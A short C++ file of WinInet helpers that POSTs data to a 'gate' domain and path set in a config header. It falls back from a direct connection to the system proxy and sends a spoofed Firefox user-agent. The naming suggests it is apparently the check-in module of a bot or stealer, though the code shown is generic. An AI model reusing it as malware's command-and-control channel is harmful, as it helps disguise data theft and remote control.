#include "inet.h"
#include "config.h"
#include "Wininet.h"

char* HTTPAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0";

BOOL HttpPostProxy(char * Domain, char * Path, BYTE * PostData, DWORD PostLength, DWORD InternetConnection,cmem & answer)
{
	HINTERNET Internet, Connection, Request;

	answer.free();

	if (!(Internet = InternetOpenA(HTTPAgent, InternetConnection, NULL, NULL, 0)))
		return 0;
	if (!(Connection = InternetConnectA(Internet, Domain, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1)))
	{
		InternetCloseHandle(Internet);
		return 0;
	}
	if ((Request = HttpOpenRequestA(Connection, "POST", Path, NULL, NULL, NULL, INTERNET_FLAG_PRAGMA_NOCACHE, 1)))
	{
		BOOL Status = HttpSendRequestA(Request, "Content-Type: application/x-www-form-urlencoded", 47, PostData, PostLength);
		if (Status)
		{
			DWORD readed;
			BOOL read;

			do
			{
				byte buf[1024];
				read = InternetReadFile(Request, buf, 1024, &readed);
				answer.push(buf, readed);
			} while (readed > 0 && read);

		}

		InternetCloseHandle(Request);
		InternetCloseHandle(Connection);
		InternetCloseHandle(Internet);
		return Status;
	}
	InternetCloseHandle(Connection);
	InternetCloseHandle(Internet);

	return 0;
}

BOOL PostData(VOID * PostData, DWORD PostLength, cmem & answer)
{
	BOOL result = HttpPostProxy(gate_domain, gate_path, (BYTE *)PostData, PostLength, INTERNET_OPEN_TYPE_DIRECT, answer);
	if (!result)
	{
		result = HttpPostProxy(gate_domain, gate_path, (BYTE *)PostData, PostLength, INTERNET_OPEN_TYPE_PRECONFIG, answer);
		if (!result) return false;
	}
	return true;
}

